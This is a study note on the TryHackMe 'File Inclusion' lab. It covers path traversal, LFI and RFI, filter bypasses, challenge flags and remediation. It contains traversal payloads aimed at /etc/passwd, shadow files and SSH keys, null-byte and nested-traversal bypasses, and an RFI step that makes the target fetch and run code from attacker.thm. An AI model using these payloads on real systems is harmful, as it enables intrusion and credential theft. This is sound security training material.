# File Inclusion (Path Traversal, LFI & RFI)

Tricking a web app into exposing — or **executing** — files it never meant to serve, because it drops user input straight into a file-handling function. Three flavours: **path traversal** (read files outside the web root), **LFI** (the file gets *executed* by a language function → possible RCE), and **RFI** (the server fetches and runs a file from *your* server → RCE without ever uploading anything).

> This is the **TryHackMe "File Inclusion" room**. It covers why the bug happens, path traversal, LFI (with source and black-box), the common filter bypasses, RFI, a challenge set, and remediation.
>
> 🔗 Sibling labs in this folder: [SQLi](../SQLi/SQL-Injection-Lab.md), [XSS](../XSS/XSS.md), [SSRF](../SSRF/SSRF.md), [IDOR](../IDOR/IDOR.md). File inclusion and [SSRF](../SSRF/SSRF.md) both abuse *the server fetching something on your behalf* — SSRF fetches a URL, RFI fetches (and executes) a file.

---

**Table of contents**

- [In plain English](#in-plain-english)
- [Why it happens](#why-it-happens)
- [Path traversal](#path-traversal)
- [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
  - [With source: no directory vs prepended directory](#with-source-no-directory-vs-prepended-directory)
  - [Black-box + filter bypasses](#black-box--filter-bypasses)
- [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
- [Testing methodology](#testing-methodology)
- [Challenge notes](#challenge-notes)
- [Remediation](#remediation)
- [Key takeaways](#key-takeaways)

---

## In plain English

Lots of apps load a file based on something you put in the URL (`?file=userCV.pdf`, `?lang=EN.php`). If the app trusts that value without checking it, you can point it at a file it never meant to give you — or, worse, a file full of code it will *run*.

| Type | What the server does with the file | Worst case |
| --- | --- | --- |
| **Path traversal** | **Reads** it and returns the raw bytes | Read `/etc/passwd`, source code, DB creds |
| **LFI** | **Executes** it (via `include()` etc.), then returns the output | Read files **+** RCE (if you can plant code in a local file) |
| **RFI** | **Fetches from your server and executes** it | RCE, and you control the file's contents entirely |

The single move behind traversal is `../` — "go up one directory". Chain enough of them and you climb to the filesystem root `/`, then walk back down to whatever you want.

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Jargon, quickly:</strong> <strong>Web root</strong> = the folder the site is served from (e.g. <code>/var/www/app</code>). <strong>Path/directory traversal</strong> = escaping that folder with <code>../</code>. <strong>LFI / RFI</strong> = Local / Remote File Inclusion. <strong>include()/require()</strong> = PHP functions that pull in a file <em>and run any code in it</em>; <code>file_get_contents()</code> just reads bytes. <strong>RCE</strong> = Remote Code Execution — running your commands on the server. <strong>Null byte (<code>%00</code>)</strong> = a string terminator that old PHP/C treats as "stop reading here". <strong>Web shell</strong> = a script you drop on a server to run commands. <strong>Allowlist / whitelist</strong> = only permit values from a fixed known-good set. <strong>WAF</strong> = Web Application Firewall.
</div>

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>How to use these notes:</strong> a lookup sheet, not rote memorisation. The one idea to keep: <em>the file function is never the bug — trusting user input to build the path is</em>. Every technique below is just a way to smuggle a path past whatever check the developer bolted on.
</div>

---

## Why it happens

Root cause: **insufficient input validation** — user-controlled input flows straight into a file function. Classic vulnerable PHP:

```php
<?php
    $page = $_GET['page'];
    include($page);          // dev expects ?page=about.php ...
?>                            // ... nothing stops ?page=/etc/passwd
```

Most-cited in PHP (`include`, `require`, `include_once`, `require_once`), but the same class appears in ASP.NET, JSP, Node.js, Python — anywhere user input picks which file loads.

**OWASP Top 10 mapping:** path traversal → **A01 Broken Access Control**; inclusion via unsanitised input → **A03 Injection**; server config enabling RFI → **A05 Security Misconfiguration**.

---

## Path traversal

Read files **outside the web root**. Happens when input is concatenated into a path and passed to a reader like `file_get_contents()` — which returns **raw contents** (no execution).

```php
<?php
    $file = $_GET['file'];
    echo file_get_contents('/var/www/app/CVs/' . $file);
?>
```

Normal: `?file=userCV.pdf`. Attack — climb to root, then into the target:

```text
http://webapp.thm/get.php?file=../../../../etc/passwd
```

**Windows** is the same idea with Windows paths (root is typically `C:\`):

```text
?file=../../../../windows/win.ini
?file=../../../../boot.ini
```

**Files worth targeting:**

| Linux | Why |
| --- | --- |
| `/etc/passwd` | All registered users |
| `/etc/shadow` | Hashed passwords (needs elevated read) |
| `/etc/issue`, `/etc/os-release` | System identification / distro |
| `/proc/version` | Kernel version |
| `/etc/profile` | System-wide defaults (umask, exports) |
| `/root/.bash_history` | root's command history |
| `/root/.ssh/id_rsa` | root's (or a user's) private SSH key |
| `/var/log/apache2/access.log` | Apache request log (**log poisoning** target for LFI→RCE) |
| `/var/mail/root` | root's mail |
| **Windows:** `C:\boot.ini`, `C:\windows\win.ini` | Boot/system config |

---

## Local File Inclusion (LFI)

Like path traversal, **but the file is passed to `include()`** — so the server **executes any code inside it** before returning output. That's the danger: under the right conditions (poisoned log, uploaded image with embedded PHP), LFI escalates from information disclosure to **RCE**.

### With source: no directory vs prepended directory

**Scenario 1 — no directory hardcoded.** An absolute path reaches any readable file:

```php
<?php include($_GET["lang"]); ?>
```
```text
?lang=EN.php              # intended
?lang=/etc/passwd         # absolute path, no restriction → included
```

**Scenario 2 — directory prepended.** The dev prepends `languages/`, but concatenation means `../` still escapes:

```php
<?php include("languages/". $_GET['lang']); ?>
```
```text
?lang=../../../../etc/passwd     # resolves to languages/../../../../etc/passwd
```

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Finding the prepended directory:</strong> submit a junk value (<code>?lang=THM</code>). The error message reveals what's prepended and the app's full disk path — both of which you need to build the payload.
</div>

### Black-box + filter bypasses

Without source, **error messages are your map**. `?lang=THM` might return:

```text
Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```

That tells you two things: input becomes `languages/<input>.php` (dir **prepended**, `.php` **appended**), and the app lives at `/var/www/html/THM-4/` (so it's 4 levels deep → 4× `../`).

| Filter / obstacle | Bypass | Payload |
| --- | --- | --- |
| **`.php` appended** (Scenario 3) | **Null byte** truncates the appended extension (PHP < 5.3.4 only) | `?lang=../../../../etc/passwd%00` |
| **Keyword filter** blocks exact `/etc/passwd` (Scenario 4) | Append `/.` or `/..` — filter misses the string, OS still resolves it | `?lang=/etc/passwd/.` (or with `%00`) |
| **`../` stripped** once, single-pass (Scenario 5) | **Nested traversal** — removing the inner `../` leaves a valid one | `....//....//....//etc/passwd` |
| **Forced directory prefix** required (Scenario 6) | Start with the expected dir, then traverse out | `?lang=languages/../../../../../etc/os-release` |

<div style="background:#fff7ed;border-left:4px solid #f59e0b;padding:12px;border-radius:6px;margin:8px 0">
<strong>Why <code>....//</code> works:</strong> the filter does one pass and deletes each <code>../</code>. Inside <code>....//</code> it finds and removes the middle <code>../</code>, and what's left is <code>../</code> — a clean traversal it never re-checks. The general lesson: <strong>single-pass sanitisation is defeatable by embedding the pattern in itself</strong>. The null byte trick is dead on modern PHP (patched 5.3.4+) but still hits legacy apps.
</div>

---

## Remote File Inclusion (RFI)

Point `include()` at a file on **a server you control**; the target fetches and executes it — **RCE without needing to write any file to the target first**. More dangerous than LFI because you fully control the file's contents.

**Requirement:** PHP's `allow_url_fopen` (and sometimes `allow_url_include`) must be **On** — so `include()` accepts URLs, not just local paths. On by default in many installs.

**The attack, step by step:**

1. Host a payload on your server, e.g. `http://attacker.thm/cmd.txt`:
   ```php
   <?php echo "Hello THM"; ?>     // real payload = web shell / reverse shell
   ```
2. Inject the URL: `?lang=http://attacker.thm/cmd.txt`
3. Target sees `allow_url_fopen` is on → sends a GET to your server.
4. Your server returns `cmd.txt`.
5. Target runs it through the PHP interpreter → your code executes on the server.

Beyond RCE, a successful RFI can also cause info disclosure, XSS, or DoS.

---

## Testing methodology

1. **Identify entry points** — not just URL query params: also **POST body, cookies, and HTTP headers** can pick the file.
2. **Observe normal behaviour** — submit valid input, learn the baseline.
3. **Submit unexpected input** — special chars, `../`, absolute paths, non-existent filenames; watch each response.
4. **Don't trust the browser** — use **Burp** to control exactly what's sent (POST params, cookies).
5. **Read the errors** — they leak directory structure, functions, appended extensions. If suppressed, fall back to trial and error.
6. **Identify the filter** — is `../` stripped? a directory prepended? an extension appended? Understanding the filter is step one to bypassing it.
7. **Craft the payload** using all of the above.

---

## Challenge notes

The challenge set's point is step 1 of the methodology — **the entry point isn't always the URL.** Each flag lived in a different input location (values below are from this room's VM instance; yours will match since these are static room flags):

| Flag | Where the input had to go | Technique |
| --- | --- | --- |
| **Flag 1** `/etc/flag1` | URL parameter, **forced input prefix** | supply the required directory then traverse out (`F1x3d-iNpu7-...` = "fixed input"). |
| **Flag 2** `/etc/flag2` | **Cookie** (`c00k13_i5_yuMmy1` = "cookie is yummy") | intercept in Burp, put the traversal payload in the cookie value, not the URL. |
| **Flag 3** `/etc/flag3` | **POST body** (`P0st_1s_w0rk1in9` = "post is working") | change method to POST / edit the body param in Burp. |
| **Playground RCE** | RFI on `/playground.php` — host a file running `hostname` | output: `lfi-vm-thm-f8c5b1a78692`. |

The flag names literally spell out the lesson: **fixed-input, cookie, post** — test every input channel, not just the address bar.

---

## Remediation

| Measure | What it prevents | How |
| --- | --- | --- |
| **Input validation with an allowlist** | Arbitrary paths & traversal reaching file functions | Map input to a fixed set; user never controls the path (see below). |
| **Disable `allow_url_fopen` / `allow_url_include`** | RFI, entirely | `allow_url_fopen = Off` in `php.ini`; also disable unused wrappers (`php://`, `data://`, `expect://`). |
| **Turn off detailed errors in production** | Attacker learning paths/functions/extensions | `display_errors = Off`, `log_errors = On`. |
| **Keep software updated** | Known bypasses (e.g. null byte, patched PHP 5.3.4+) | Patch OS, web server, PHP, frameworks. |
| **Web Application Firewall** | Common `../`, null-byte, URL payloads (defence in depth, *not* a code fix) | Detects/blocks automated scanning. |

**The core fix — never let the user control the actual path:**

```php
<?php
    $allowed = ['en' => 'languages/EN.php', 'ar' => 'languages/AR.php'];
    $lang = $_GET['lang'] ?? 'en';
    if (array_key_exists($lang, $allowed)) {
        include($allowed[$lang]);      // input is only a KEY, never a path
    }
?>
```

---

## Key takeaways

- **The file function isn't the bug — trusting user input to build the path is.** `file_get_contents()` reads; `include()`/`require()` **execute**.
- **Path traversal** (`../` up to `/`, back down) = read files outside the web root. **LFI** = the included file runs → possible **RCE**. **RFI** = server fetches & runs *your* file → RCE without any upload.
- **Error messages are the black-box map** — they leak the prepended directory, appended `.php`, and the app's full disk path (→ how many `../` you need).
- **Filter bypasses:** null byte `%00` (legacy PHP only), trailing `/.` against keyword filters, **nested `....//`** against single-pass `../` stripping, and prepending the forced directory then traversing out.
- **RFI needs `allow_url_fopen` on;** disabling it kills RFI outright.
- **Entry points are everywhere:** URL, POST body, cookies, headers — the challenge flags (fixed-input / cookie / post) exist to drill exactly that.
- **Fix:** allowlist input to a fixed set (map a key → a path), disable remote-include + unused wrappers, hide errors, patch, and add a WAF as a layer — not a substitute — for secure code.

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>How this sits vs the others:</strong> file inclusion and <a href="../SSRF/SSRF.md">SSRF</a> both weaponise <em>the server fetching something for you</em> — SSRF aims a request at internal URLs/metadata; RFI aims an <code>include()</code> at a URL and gets code execution. <a href="../SQLi/SQL-Injection-Lab.md">SQLi</a> and <a href="../XSS/XSS.md">XSS</a> inject into a query/page; LFI/RFI inject into a <em>filesystem path</em>. All four share one root: unvalidated input crossing into a trusted context.
</div>
